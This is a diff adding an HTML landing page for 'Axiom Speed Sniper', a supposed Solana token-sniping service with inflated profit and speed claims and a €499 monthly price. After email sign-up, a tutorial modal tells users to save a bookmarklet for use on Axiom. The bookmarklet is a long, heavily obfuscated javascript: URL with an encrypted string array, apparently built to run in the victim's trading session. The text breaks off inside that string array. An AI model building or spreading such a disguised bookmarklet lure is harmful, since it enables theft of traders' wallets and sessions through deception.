@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axiom Speed Sniper - The Future of High-Velocity Trading</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+
+</head>
+<body>
+    <div class="main-container">
+        <nav class="navbar">
+            <div class="nav-brand">
+                <div class="logo">
+                    <i class="fas fa-bolt"></i>
+                </div>
+                <span class="brand-text">Axiom Speed Sniper</span>
+            </div>
+            <div class="nav-links">
+                <a href="#" onclick="showModal('pricing')" class="nav-link">Pricing</a>
+                <button onclick="showModal('login')" class="login-btn">Login</button>
+            </div>
+        </nav>
+
+        <section class="hero">
+            <div class="hero-bg"></div>
+            <div class="hero-content">
+                <div class="hero-badge">
+                    <i class="fas fa-crosshairs"></i>
+                    <span>Lightning-Fast Token Sniping</span>
+                </div>
+                
+                <h1 class="hero-title">
+                    <span class="gradient-text">Axiom Speed Sniper:</span><br>
+                    <span class="white-text">The Future of</span><br>
+                    <span class="gradient-text-alt">High-Velocity Trading</span>
+                </h1>
+                
+                <p class="hero-subtitle">
+                    Snipe new tokens with lightning-fast precision on the Solana network. 
+                    <span class="highlight-blue">Millisecond execution</span>, 
+                    <span class="highlight-green">maximum profits</span>, 
+                    <span class="highlight-purple">zero delays</span>.
+                </p>
+
+                <div class="cta-section" id="ctaSection">
+                    <button onclick="showModal('emailForm')" class="cta-primary">
+                        <i class="fas fa-rocket"></i>
+                        Start Your Free Trial
+                    </button>
+                    <div class="cta-secondary">
+                        <p class="secondary-text">Or subscribe monthly</p>
+                        <button onclick="showModal('pricing')" class="secondary-btn">€499/month</button>
+                    </div>
+                </div>
+
+                <div class="mobile-warning" id="mobileWarning" style="display: none;">
+                    <div class="mobile-icon">
+                        <i class="fas fa-desktop"></i>
+                    </div>
+                    <p class="mobile-text">Desktop Required</p>
+                    <p class="mobile-subtext">This platform is only available on desktop computers for optimal trading performance.</p>
+                </div>
+
+                <div class="stats-grid">
+                    <div class="stat-item">
+                        <div class="stat-number blue">&lt;1ms</div>
+                        <div class="stat-label">Execution Speed</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number green">99.9%</div>
+                        <div class="stat-label">Success Rate</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-number purple">24/7</div>
+                        <div class="stat-label">Active Monitoring</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="video-presentation">
+            <div class="video-content">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        See <span class="gradient-text">Axiom Speed Sniper</span> in Action
+                    </h2>
+                    <p class="section-subtitle">
+                        Watch how our lightning-fast sniping technology dominates the Solana market
+                    </p>
+                </div>
+                
+                <div class="video-container">
+                    <div class="video-wrapper">
+                        <video id="presentationVideo" controls preload="metadata" poster="">
+                            <source src="presentation.mp4" type="video/mp4">
+                            <p>Your browser does not support the video element.</p>
+                        </video>
+                        <div class="video-overlay" id="videoOverlay">
+                            <button class="play-button" onclick="playVideo()">
+                                <i class="fas fa-play"></i>
+                            </button>
+                            <div class="play-text">Watch Demo</div>
+                        </div>
+                    </div>
+                    
+                    <div class="video-stats">
+                        <div class="video-stat">
+                            <div class="stat-icon blue">
+                                <i class="fas fa-eye"></i>
+                            </div>
+                            <div class="stat-info">
+                                <div class="stat-value">2:30</div>
+                                <div class="stat-label">Duration</div>
+                            </div>
+                        </div>
+                        <div class="video-stat">
+                            <div class="stat-icon green">
+                                <i class="fas fa-rocket"></i>
+                            </div>
+                            <div class="stat-info">
+                                <div class="stat-value">Live</div>
+                                <div class="stat-label">Demo</div>
+                            </div>
+                        </div>
+                        <div class="video-stat">
+                            <div class="stat-icon purple">
+                                <i class="fas fa-chart-line"></i>
+                            </div>
+                            <div class="stat-info">
+                                <div class="stat-value">Real</div>
+                                <div class="stat-label">Profits</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="video-cta">
+                    <p class="video-cta-text">Ready to start sniping like a pro?</p>
+                    <button onclick="showModal('emailForm')" class="video-cta-btn">
+                        <i class="fas fa-bolt"></i>
+                        Start Your Free Trial Now
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <section class="features">
+            <div class="features-content">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        Built for <span class="gradient-text">Speed</span>
+                    </h2>
+                    <p class="section-subtitle">
+                        Advanced algorithms and cutting-edge infrastructure designed for the fastest traders
+                    </p>
+                </div>
+
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon blue">
+                            <i class="fas fa-bolt"></i>
+                        </div>
+                        <h3 class="feature-title">Lightning Execution</h3>
+                        <p class="feature-description">Sub-millisecond order execution with direct blockchain integration for maximum speed.</p>
+                    </div>
+
+                    <div class="feature-card">
+                        <div class="feature-icon green">
+                            <i class="fas fa-crosshairs"></i>
+                        </div>
+                        <h3 class="feature-title">Precision Sniping</h3>
+                        <p class="feature-description">Advanced algorithms detect and execute trades on new token launches instantly.</p>
+                    </div>
+
+                    <div class="feature-card">
+                        <div class="feature-icon purple">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <h3 class="feature-title">Secure & Reliable</h3>
+                        <p class="feature-description">Bank-grade security with 99.9% uptime guarantee and automated risk management.</p>
+                    </div>
+
+                    <div class="feature-card">
+                        <div class="feature-icon blue-purple">
+                            <i class="fas fa-clock"></i>
+                        </div>
+                        <h3 class="feature-title">Real-Time Monitoring</h3>
+                        <p class="feature-description">24/7 blockchain monitoring with instant notifications and automated responses.</p>
+                    </div>
+
+                    <div class="feature-card">
+                        <div class="feature-icon green-blue">
+                            <i class="fas fa-chart-line"></i>
+                        </div>
+                        <h3 class="feature-title">Smart Analytics</h3>
+                        <p class="feature-description">AI-powered market analysis and predictive algorithms for optimal entry points.</p>
+                    </div>
+
+                    <div class="feature-card">
+                        <div class="feature-icon purple-green">
+                            <i class="fas fa-rocket"></i>
+                        </div>
+                        <h3 class="feature-title">Solana Optimized</h3>
+                        <p class="feature-description">Built specifically for Solana's high-speed network with native integration.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="final-cta">
+            <div class="cta-card">
+                <h2 class="cta-title">
+                    Ready to <span class="gradient-text">Dominate</span> the Market?
+                </h2>
+                <p class="cta-subtitle">
+                    Join thousands of traders who are already using Axiom Speed Sniper to maximize their profits
+                </p>
+                
+                <div class="final-cta-buttons" id="finalCtaButtons">
+                    <button onclick="showModal('emailForm')" class="final-cta-primary">
+                        <i class="fas fa-rocket"></i>
+                        Start Your Free Trial
+                    </button>
+                    <div class="final-cta-info">
+                        <p class="final-cta-text">No credit card required</p>
+                        <p class="final-cta-subtext">3 days free, then €499/month</p>
+                    </div>
+                </div>
+
+                <div class="final-mobile-warning" id="finalMobileWarning" style="display: none;">
+                    <div class="mobile-icon">
+                        <i class="fas fa-desktop"></i>
+                    </div>
+                    <p class="mobile-text">Desktop Only</p>
+                    <p class="mobile-subtext">Please use a desktop computer to access the platform</p>
+                </div>
+            </div>
+        </section>
+
+        <footer class="footer">
+            <div class="footer-content">
+                <div class="footer-brand">
+                    <div class="logo">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <span class="brand-text">Axiom Speed Sniper</span>
+                </div>
+                <div class="footer-links">
+                    <a href="#" class="footer-link">Privacy Policy</a>
+                    <a href="#" class="footer-link">Terms of Service</a>
+                    <a href="#" class="footer-link">Support</a>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>© 2025 Axiom Speed Sniper. All rights reserved. Trade responsibly.</p>
+            </div>
+        </footer>
+    </div>
+
+    <div id="emailModal" class="modal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="hideModal('emailModal')">&times;</button>
+            <div class="modal-header">
+                <div class="modal-icon">
+                    <i class="fas fa-envelope"></i>
+                </div>
+                <h3>Start Your Free Trial</h3>
+                <p>Enter your email to begin your 3-day free trial</p>
+            </div>
+            <form onsubmit="handleEmailSubmit(event)">
+                <input type="email" id="emailInput" placeholder="Enter your email address" required>
+                <button type="submit" class="modal-btn">Continue to Setup</button>
+            </form>
+            <p class="modal-disclaimer">No credit card required. Cancel anytime.</p>
+        </div>
+    </div>
+
+    <div id="tutorialModal" class="modal">
+        <div class="modal-content large">
+            <button class="modal-close" onclick="hideModal('tutorialModal')">&times;</button>
+            <div class="tutorial-header">
+                <h2 class="gradient-text">Start Trading in 60 Seconds</h2>
+                <p>Add Axiom Speed Sniper to your browser bookmarks for instant access on Axiom.</p>
+                <div class="tutorial-warning">
+                    <i class="fas fa-bolt"></i>
+                    <span>Compatible exclusively with Axiom protocols for maximum performance</span>
+                </div>
+            </div>
+
+            <div class="tutorial-button">
+<a id="bookmark-tool" href="javascript:(function()%7Bfunction%20a0_0x576c(k%2CW)%7Blet%20n%3Da0_0x9ee4()%3Breturn(a0_0x576c%3Dfunction(W%2Cc)%7BW-%3D331%3Blet%20o%3Dn%5BW%5D%3Bvoid%200%3D%3D%3Da0_0x576c.VhvxeE%26%26(m%3Dfunction(k)%7Blet%20n%3D%22%22%2Co%3D%22%22%2Ct%3Dn%2Bm%3Bfor(let%20W%3D0%2Cc%2Co%2Cd%3D0%3Bo%3Dk.charAt(d%2B%2B)%3B~o%26%26(c%3DW%254%3F64*c%2Bo%3Ao%2CW%2B%2B%254)%26%26(n%2B%3Dt.charCodeAt(d%2B10)-10!%3D0%3FString.fromCharCode(255%26c%3E%3E(-2*W%266))%3AW))o%3D%22abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789%2B%2F%3D%22.indexOf(o)%3Bfor(let%20W%3D0%2Cc%3Dn.length%3BW%3Cc%3BW%2B%2B)o%2B%3D%22%25%22%2B(%2200%22%2Bn.charCodeAt(W).toString(16)).slice(-2)%3Breturn%20decodeURIComponent(o)%7D%2Ca0_0x576c.mFkzvl%3Dfunction(c%2CW)%7Blet%20o%3D%5B%5D%2Cd%3D0%2Ck%2Cn%3D%22%22%3Bc%3Dm(c)%3Blet%20t%3Bfor(t%3D0%3Bt%3C256%3Bt%2B%2B)o%5Bt%5D%3Dt%3Bfor(t%3D0%3Bt%3C256%3Bt%2B%2B)d%3D(d%2Bo%5Bt%5D%2BW.charCodeAt(t%25W.length))%25256%2Ck%3Do%5Bt%5D%2Co%5Bt%5D%3Do%5Bd%5D%2Co%5Bd%5D%3Dk%3Bt%3D0%3Bfor(let%20W%3Dd%3D0%3BW%3Cc.length%3BW%2B%2B)t%3D(t%2B1)%25256%2Cd%3D(d%2Bo%5Bt%5D)%25256%2Ck%3Do%5Bt%5D%2Co%5Bt%5D%3Do%5Bd%5D%2Co%5Bd%5D%3Dk%2Cn%2B%3DString.fromCharCode(c.charCodeAt(W)%5Eo%5B(o%5Bt%5D%2Bo%5Bd%5D)%25256%5D)%3Breturn%20n%7D%2Ck%3Darguments%2Ca0_0x576c.VhvxeE%3D!0)%3Bvar%20m%2Cd%3Dn%5B0%5D%2CW%3DW%2Bd%2Cd%3Dk%5BW%5D%3Breturn%20d%3Fo%3Dd%3A(void%200%3D%3D%3Da0_0x576c.RwbVdt%26%26((d%3Dfunction(W)%7Bthis.XdQYqB%3DW%2Cthis.AxjZOM%3D%5B1%2C0%2C0%5D%2Cthis.dvlxpB%3Dfunction()%7Breturn%22newState%22%7D%2Cthis.ErhMjl%3D%22%5C%5Cw%2B%20*%5C%5C(%5C%5C)%20*%7B%5C%5Cw%2B%20*%22%2Cthis.izeeaZ%3D%22%5B'%7C%5C%22%5D.%2B%5B'%7C%5C%22%5D%3B%3F%20*%7D%22%7D).prototype.cqJrLw%3Dfunction()%7Bvar%20W%3Dnew%20RegExp(this.ErhMjl%2Bthis.izeeaZ).test(this.dvlxpB.toString())%3F--this.AxjZOM%5B1%5D%3A--this.AxjZOM%5B0%5D%3Breturn%20this.lFAeUT(W)%7D%2Cd.prototype.lFAeUT%3Dfunction(W)%7Breturn%20Boolean(~W)%3Fthis.yNjDlu(this.XdQYqB)%3AW%7D%2Cd.prototype.yNjDlu%3Dfunction(W)%7Bfor(let%20W%3D0%2Cc%3Dthis.AxjZOM.length%3BW%3Cc%3BW%2B%2B)this.AxjZOM.push(Math.round(Math.random()))%2Cc%3Dthis.AxjZOM.length%3Breturn%20W(this.AxjZOM%5B0%5D)%7D%2Cnew%20d(a0_0x576c).cqJrLw()%2Ca0_0x576c.RwbVdt%3D!0)%2Co%3Da0_0x576c.mFkzvl(o%2Cc)%2Ck%5BW%5D%3Do)%2Co%7D)(k%2CW)%7Dfunction%20a0_0x9ee4()%7Blet%20W%3D%5B%22W4ldNCoynmoXW4W8%22%2C%22tY0HW6yY%22%2C%22W5pdVZpcT0NcVW%22%2C%22WQCJW7ddM00%22%2C%22gIdcJhn8cmoeWOBcUhxdGW%22%2C%22BHr%2FlMu%22%2C%22W57cJSkSiMu%22%2C%22c8ozWRJdVmkR%22%2C%22WO3dUthcPaBcPSkrxmoni8oSW5RdN8o9WRddICk9m8oZW7PSWQ7cPfzDW7HdwKH5l8kGW6dcI8o9nXNcVYldGvxcKuz6wSo3mCkgDaZcLCk%2BctG2W4CQW7m%2BnMiMWRBdSgNdNdldQXbssbTrgmoLW695WRpdH8kqt07cJvZdMu0vWQVdO8oBW4VdImoZW7LrWO1XqdaMWOzajx7cUvPWrmoRB8oqW7ijgI9pW54iW7W9o8opW5xdTCoSaCoaiNBcQeFcSCkXW7ldJaiLr3LpvrJcLSoyW4JcGZRcUWZcVqPfWQ%2FcTKhcMCkoWPreW5RcRx1ZWPhcLCkWW7TotYNdMWymW5RcLSoxW7DTs8olWPJcHHpcGCoiW5aiWPPqW4pdQSoTACkKW4T9W7XxhqtcIvTGWRbHpCoLWQlcSCofW7SjtKdcNmkY%22%2C%22hmo8krDj%22%2C%22W5z7DmoBeHKdcxJcHSoc%22%2C%22WPu%2BW5ZdKvq%22%2C%22WPZdGdZdOmofWRJdVM8WoaJcNSk3r0pdRL5CWO8lnbhdRMFcIeCffq%22%2C%22WQjjW6tcVaNcGmoukCkqzSoK%22%2C%22WPNdTCoE%22%2C%22W7xdNCofxK4%22%2C%22DmkVW4jBW6JcJ8oBWQFdO040W5ddImonm8oVsYmkW6xdN1fEWQfEkIddGhjtWOLiE8kFf8o0WRddTZlcRSkLW7lcMCklWRJcKLtcJchdQeDaoZRdIcmXlgOHccpcIZLtWQ%2FcS8k3nmotWQC7WOKjW6nyECoCWOJdNrjwnL8xDHhdP8kqWOONW6ecW7ddVCkkECkmv8kMWOdcM3VdT8kpWQnEW4%2FcOSoFW7lcKWyzdhrBmmosW4qvzSo6wXS1WQqHWQnyB8obW5z2FbZcPmkdbmoxoCk6WOlcGfr4tmoQdN%2FdRvCxaCooEhldQSkNW6zLW4RcP1nQW4%2FcMCkmf8kgW4P0W4TrnCkJW5ikWRSQBXVcPtlcJSoqW6pdImkPWR0bWPZdRW%2FcMchdQvhcHSoNFmoXWOZdQSkZW7hdVN4IWQldSWLzW7NcK8kRW6RcTCkfW68SzCkavSo7WO1wWRWhB3FdQNWQW5FcM8ocrmoyB8oQWPxdJdtcH8oGu8kMBSkNWONdQCoLumksy07dIX8vW73dUmkkW64qW53dOCoVB0ZcVwT1bmovWRXcoCkwWPFdOrRdV8kllmogq8kUWQuoWQSskCoEwCkbbSoRqCkKWQaSWPJdNCoNb8oGWPiaWQtcRSk%2BaG%2FdIIXjpmkDW4uEisT9WRNdG047F35hWPe4crRdSM3cVCoi%22%2C%22W4ddM8ocWOJcGG%22%2C%22WOtcImkziCklWPnK%22%2C%22W5JcQeOXbCkgFfBdTMjtqHG%22%2C%22W5DHBSoCcqvyaMpcN8ovW5lcRSk8W5hcPbmDW40sWQlcHmk8wmkKW77cGtLNbCoSW7agm8oPtmoUWQddS3JcP3TYvHdcNmkCW41hm8k5WQpcR8kzW4xdOmkpWQDqWONcG3uCCXxcJCoeiSkXW5lcSCojeCkoWRZcKCoFcHZcMJJdJw7cLuJdKmkyeSkPmCopWP8%2FWPjneX0iW5SEWPxdNsOywCkj%22%2C%22WQW%2BW4pdKe8%22%2C%22ddG5lSk2d8kpex%2FcNSkrW6brBZhdONhcRMBcN8kblu4HnCk%2FnwNdNCk2xSk8W505mc0kstxdN8o3exjgDIrrWPtdV0WcW6jOug4EiCkiDJtdMKJcRvVcGCoWqf7dQSk9cSo%2BnCoAhaPzWQhcQ8oNvJH2mv3dJCkgCbCtW482lmkGocCXW7ZdQfTwamkMjCkSWRLno8kP%22%2C%22WQymzCkQkq%22%2C%22lmk%2ByxddSSoCW47cIh%2FcL8kMWQKg%22%2C%22cYlcMwb3aSoZWQRcTh%2FdHGqgWOC%22%2C%22qYeuW6O9%22%2C%22W5VcK8k3BmorWOTBWRNcLmoPoveOWRyvWP0%22%2C%22kmk9qfFdPa%22%2C%22WORdUINcU34%22%2C%22Emk9W41jWRycWRFcVmoqWQf%2FCq%22%2C%22p8ovWQxcOK4%22%2C%22E8ownKeXWQ%2FcP1FdL8ojdW%22%2C%22WQu4W6ZdUINcOfJcL8kz%22%2C%22W4BdHSoNhrRcM3u%22%2C%22W78LWQD8smkn%22%2C%22WP%2FdS8oqW5VcKxv3mce%22%2C%22WQCWW53dMZK%22%2C%22W7DWdhS%22%2C%22WP7dR8oBW5ZcNgXN%22%2C%22uxCzW783%22%2C%22oIDjWRnUWPlcM8o%2BW4%2FdRYncWR0lx0uTWPRcJuXdWQ1pW44sc8oEjK1uWOFcO0ddLSkmWO7cSCkZW75yW5vbW65qWQFdUKngW6SceCklj8k5ug7dM2BdQSkaWQldRatcQvCYvGyyuNahWPTnbmkipCkTDJLHW6NdIeygW6dcNbVcPmkKEsbda3dcGwdcH0PLaCkroCkExmoZkdrPWPBdQIFcRmkuW5%2FdVSorCx1MdSk2tmoZaSofWPhdSYpcStHfWQtcKt0iW7W0wabkW6RcNCkprfdcHhTQWPpcK8otwmoci8oKxSk1WOlcJN4gW4DIbCkqWRFcGSk9lvldLrRcKSkiWRuCWQFdU0i%22%2C%22EGHQox3dOIBcISkmh8ohtXS%22%2C%22AxLCzCo4%22%2C%22WQO2W7RdOIVcV1JcLmksWOa%22%2C%22WQ8WW7ZdUW%22%2C%22wbaRW7mY%22%2C%22W4ddNCotiCo5%22%2C%22W4NdQsJcQLa%22%2C%22WQSRzSkMoa%22%2C%22yL1RlCoXtColWRn0%22%2C%22WONdUCoqW7ZcUNT9kZmsDa%22%2C%22m8kIW6CnWP4%22%2C%22fM1tW71OW6CS%22%2C%22WQZcLmklzmk9WO1LaCouWRmfWRFdVZ0FkmodWPhcUhVdQYBdV8oWWQxcTKJcJSkXW5tdNZ3dUGhcLtVdQ0CrbGzlW7ZcO8kXW6OSW5umg8kNWP3cQx%2FdHd8IWRFcLSkyfuLzWRpdGKFcPSkWCsddHmoCa0pcLmopW7mdvmkzWOhcLSojCfiuW5aO%22%2C%22oSoAWR7cPq%22%2C%22v3C%2FW706%22%2C%22mCoMaGLk%22%2C%22WPNdHSoIlL%2FcLgHeW5%2FcJvGWW4BdGJhcVCkli8kxW4zJwWFcP8odW4NcI8oUymouW6%2FdH8k7WQvGW4aEe8kbW5NdLctdHSk0WROsACkSqSo7W6ashmo6iSosW6jOvSoDedlcVxZcGahdTSkwWR4LnviWmrFcTWzEWQNcOmo2W43dVCo1Bmk4WPdcMmk%2BWPDgm2D4wCk5jeldItnZt14dfSkiW4JcPGxcG8kvyGBdJtL5W6idi1hcRvlcO8k%2FcweyW5aEgNZdVW%22%2C%22bZfzW4iRW4pdNCoPW5W%22%2C%22W5%2FcTN09jG%22%2C%22cSoebYLG%22%2C%22WPxdQsu%22%2C%22W5hdKmoSptZcJg9uW47cIXe%22%2C%22pSoDjYPC%22%2C%22W790WPfvkwdcP0Dxfq%22%2C%22bd8gW4uFW7FdO8oL%22%2C%22rbWIW7KH%22%2C%22CSo2W6PBWPyGW7q%22%2C%22WRC%2BW67dM1a%22%2C%22W5xdHmohlCoP%22%2C%22yfjWcCo9r8oh%22%2C%22W4pcVmkTcuq%22%2C%22vCkxW6dcUCkVpmojc1lcOw7dKgG%22%2C%22WRhcTeC%2FsWddGq%22%2C%22W5vSWRT9nq%22%2C%22xmk8BY53WQHGW4jgW4CQzCo2%22%2C%22W6T%2FWOGK%22%2C%22umk9WOLzWQi%22%2C%22WQXPWOPDFgtcQ0XwcCozm8oWW7xdUI7dJ8kgaCofWPRcPCktW6FdUNFcSCokW7VcMdhcH8kvtbZdOZldPayEWPnaW48ksvtdGCo0t8oWySkbW6n5W5zXWOpdRCksWOj8W4FcMatcNYddNZH1bCotr8omW4hcNZldLSkQWQBdGmkOkmoGjIjWf8o5W57dJSo3Bgy8kCkyWPK9W4ldNajDWPneW5pcG8k%2Fad7cRMxcSNdcMgxdSv3cG8kFBCoKW6ZcM1a8A8knWOvxt8kVwmkbW5mdWRZcK2VcLLLSWRRdTGbOCwqftc8YWQZcHKRdNCkOrWpcU08ok8oeW5PtuK8sEdldUb%2FdK8kWW4XdWPddMmozW5VcSHRcRLm%22%2C%22D8k2WPTkWQ0pWRBcTmkvWRL%2FFh9sWOeaWRC%22%2C%22W7j6W6FdJW%22%2C%22W7ddNConDLi%22%2C%22WOhcPhy%22%2C%22WO0pC8k3pW%22%2C%22W4ldUIBcRrZcVCkzs8onzSkYWPdcH8kNW7y%22%2C%22WQ3dUrBcGq%22%2C%22W67dSunj%22%2C%22W6ilWQRdOvq%22%2C%22eSoZWQtdV8kFWPjpW6JdM8kIWOC%22%2C%22dZxcJ2i%22%2C%22lCkGA3ldRq%22%2C%22WQy4W7FdRa%22%2C%22WOXle3RcQJpdO0RcTu4kBJ4pW6pcR8oEWOpdP8kit8kcxvNcM8o1WQWhW6hdNCorWPJdN8oLW4elgq%22%2C%22h8oHrW%22%2C%22WORdLSkki2u%22%2C%22WRzveLRcMW%22%2C%22WPpdS8ogW60%22%2C%22W7qKW6NdQcldSW%22%2C%22W5FdNmoY%22%2C%22q3mqW78R%22%2C%22nCoUkM8JW60fWPjhW4m5nCkiiCkQWOzeqmoDBmk5qYRdPCkfjHLdWPO%2FFCo3W4OgfmkcgWPIWOqTx2tdMSk3WPdcQspdTwCmiqvxpcZdR8o%2BamkQqaGgxmoyW7xcV8oztmoeW6lcLGhdICkvWOTZW7W%2BWQ8uWRlcTezThSomm3ddLmozFLpdJmkRb3yrhcNdK8k8itTEWRnGDaNdI8kIWRBdPXNcRmkOWPtdTxRdL8kkWOlcTmonW69sW5X2W4SCss1MWQRdNSopebtdINFcQCk3WO1ABwXoW60XW4WiWOBdOmk2WRv8W6VdGuBcQKDTx8otnX%2FdIX5Wj8kQE1lcNmkpd2KmmLTMomonWQWwWPOFkN3cL8oGFLWHyxFcKmk4W7pdRaeXW4ldRh3cNGe%2BqfbhsCkrWPpdGmozWOxdL8oxyJ48vNrwrM0vWQGMW6CkW4Orb8ojW7LaW6fvdbZdNwVcTmo2WQNdPmk4caqcaSk5WPC2WRJdPLRdMmoRvq7cGLGIWP0rW5CGyCkUWQpcSc%2FcQmkkW4aUWPxcT8oZiHyTW7RcNmo8WQRcG8oTsYRdSdFdH8o%2FocRdVI%2FcPmk%2FWQHEWR7dRCkAWOLKqMpcH15gW41QWQldP3mOqI80WQZdO8kSWQFcPXCXW5GwWPJcT8kfWQiYgSo%2FWO0YeSoWvmoRssdcP8oTWPldHHatfSkEW5vGW6GTC3dcJmkFuv%2FdL8kNECopA0jwnSo4a8kWW5VdRmo1bCodW65XWPhcGCoFmmk3EKNcJmo3tConW7pdGmkprLG7W5lcKZBcKCoUfSofW71WWQtdGGBdSCoIBCo6rmo4WRZdTCoVWQ3dNmkmbSkmW4JdHdFdSwRcK8k8W5BcImovW4myFmobWONcHNVcRs4PnWNdGSovfrStW7meW7%2FcJf3dVmk0W5NcGhhdJLRcIb3cU8kAiuzNfSoyW5PZW5zpbmomW6VcLHCLDWlcRtf7bCoMxsxcISoesCkIWPldHfPuwYtdGrFcKmoTeSkKW53dV8o0pCkKlSkfk8k3sghcGhWEWONcVConWOtdNSkCkmohjMZdO8oAqSoLWQ%2FdOYLopKmnA1VcLSkcW41YtLZcQmo8W5y8ECk9fKNdL8kPW7VcM8oUyIahF8oDWOlcU8koWPCQtrxdV8oDW6ddH0ueW6OdiSkPWOlcOSk3zcT6whldOmk5W7xdT8oKWPVdN8khW7BcRbZcOh7dOY3dVshcUYlcIHrTW74hW4jHcSovzttcKJrWaJVcPmoHW6uNrCoMl2ORW4HhW6mdv8oGW5OQmsXHWQ4SWPXLCSkkDw0AiCkPWRhcGCkvW5BdVIrAWQyEWPxcR01RcSo%2FlerlW43dLIFcNbGKW47dPmo0qaZdS0ldRCkMzCoWfmk5hhaIvcnXE8oUB8kBWQjuWPhdMSkRtu8MWOKFW7f4W7pdOg5fvtdcHxBcNMhdLt%2FdSmo%2BW6RcGaCiW6FcPhJcMG%22%2C%22W7HKymkr%22%2C%22W7LJzCkgnmoT%22%2C%22WPtdVr0%22%2C%22wSkRtWfI%22%2C%22W4VdM8oEn8o4W5G1%22%2C%22W6NdVfjyW73cNYbVWRBcUSki%22%2C%22W696B8kjfq%22%2C%22sGCMW7y4dq%22%2C%22WQz4CSkpC8o%2Fmmo8W5rnWQ5hxYldL8otWPtdGK5Xu8kzDa3cHLPMW6NdR8k3qKFcJbNdKvG8WRhdU8oyWOldJSoTgrD9WQ4GC8oEhSk9e8kcW4GpWRZdQCo3zXGrfJ8gWPJdRG44W6zUqSouoCkPdvdcKrFcHSkNW7umW44hbJqfWQG2WQn%2FWR3cIwxcIhzzkCoSsSkUwIJdQGe0W4BcUqb2eSkghCors8opW4OPBCoQWPtdUGfltbWSjmo5u2PCdCkHW4akWRldHSkxWPjUWOCOo3XaoCotW5FdHmkkWRFcO8o2gCojgSkwW5yvzsWVWPVcQh4CwCkSWRpdHSobmmkOWOmj%22%2C%22W7xdMCoqw18%22%2C%22WQ0KW7NdKKDKCKNcNa%22%2C%22W4%2FcO181%22%2C%22W68DWPjBqa%22%2C%22WPtcJmkEDCkOWP1ZfCo6WRuKWOJdRq%22%2C%22WQKnz8kApdaE%22%2C%22eSolWQldOSoWB8kvha%22%2C%22W6qhWOpdRLa%22%2C%22WPj4hM3cQG%22%2C%22W4%2FdLCoKWRpcHW%22%2C%22fCkHW6WRWQW%22%2C%22WPJdTvj9x0BcGSotc8kGWQvnFduTjhFcGSkss8knamk3rNFdVaLtW73cHeC1ymk3WR4Lg8krnYhdTmkMeSo4eCknhmktW7NcHM%2FcGSoaW6XyW5NcKMpdVCkzWO4or0FdJZCDaexcNN1uWPTzW5jwsCkOW7Dy%22%2C%22pCkdsxpdVG%22%2C%22WPNdM8k6WRJcTcPf%22%2C%22W4RcJ3ZdLCoCW7VcOW%22%2C%22W4RdJmo4a8oX%22%2C%22CxiDW7XUW6BdICo9W4RdQq%22%2C%22WOpcHsZdJgyoWPRcSsNcHmkiWOBcQSkwbZKSWR4%22%2C%22WOBcI8kAemkaWO9tWPzhW5ON%22%2C%22W4ZcL8k6o25AW78%22%2C%22btitWP3cNSkH%22%2C%22iSkLAG%22%2C%22W4tcLhRdOmooWQldPdaPAbpdGCo7rXpcTX0rWPftzKdcPIlcLWTcuINcRSkHW7vhtGhdRdnBcZK9jSosWOmjvCkI%22%2C%22WRFdSWVcKa%22%2C%22kb%2FcSa%22%2C%22fZxcMMi%22%2C%22W5FdNmoYWPhcSYvbW4NcHW%22%2C%22W4DXD8ohea4%22%2C%22W7DIe0pcKuP8%22%2C%22W4ZcNSkXc3zlW6lcH29JpCkOW5qplmkC%22%2C%22rCk%2BgsKcCCo%2BdrK%22%2C%22WPJdTvj9x0BcGSkrsSkNWQDzFJy5mYNcMmousCkhfSoPD13dVaLtW73cHeD3ACkPWR84rmopFJ3dVSkRa8kQDmodbSktWRRdIspcLmocW64mWQhcIgpdVSoFW4HiaqhdJM1NgKxcIc0mWOaWWOCegSoNWQvcBSo1WRaxW4TsWQCKWPZdJ8oym8kQlSo4WOZdLCooW6almCoAsfWEvSozBSk2uqtcGCkRyGhdVgLjW4PXWPScuSkLeSklhCoYw8kDW7a0hqldVSo2W6ykW5VcVstdPmkzW7ZcRSoibSommXHzWOZcT8oxcCoUiSoCDSk5WQTHfe3dQCodDWZdIHHeW4RdRsFdKZNdMxtcU8oK%22%2C%22oCoSWR7cG2W%22%2C%22W6RdTmoMWRFcNa%22%2C%22W7WLWQDN%22%2C%22WQpcGtZdGa4%22%2C%22imoSW68fWOu%22%2C%22iSk6W7ecWPa%22%2C%22W6z8WRLxlG%22%2C%22vSkzEYDS%22%2C%22m8ocW4SVWQe%22%2C%22WPFcHmkBFmkKWPLXc8oTWRm0WRldLq%22%2C%22W6rOWP1ul3%2FcO1XhoComiCoO%22%2C%22W71%2FdNlcHNPCoGG%22%2C%22W6HgrCk7na%22%2C%22W5bstCkPiq%22%2C%22W5%2FcHCkHrSov%22%2C%22W4RcR0OIcmkWxfBdTMXcqX4%22%2C%22vmkGW6%2FcUSoSW40rW5ldTmkKWOrEWRy%22%2C%22pmkTyeNdOa%22%2C%22D1D6q8or%22%2C%22W6xdGSoCwu7cIHK%22%2C%22WONdOHPHrmotd0RdLhPNFX8%22%2C%22W4JcRLy8fa%22%2C%22WRtdVSk6j3W%22%2C%22W7T%2Fa3VcNvfJ%22%2C%22W4zGy8oeaW%22%2C%22W6JdLSoxhHC%22%2C%22W790WP9wnxdcQq%22%2C%22W6bOehi%22%2C%22pCkmEXbHWOpcSq%22%2C%22fYiwWQZcNCk3WRVcVvZcVWddHuJdKSopta%22%2C%22WPBdPZNcTsRcGCkT%22%2C%22W4tdHCoKlbhcH0jiW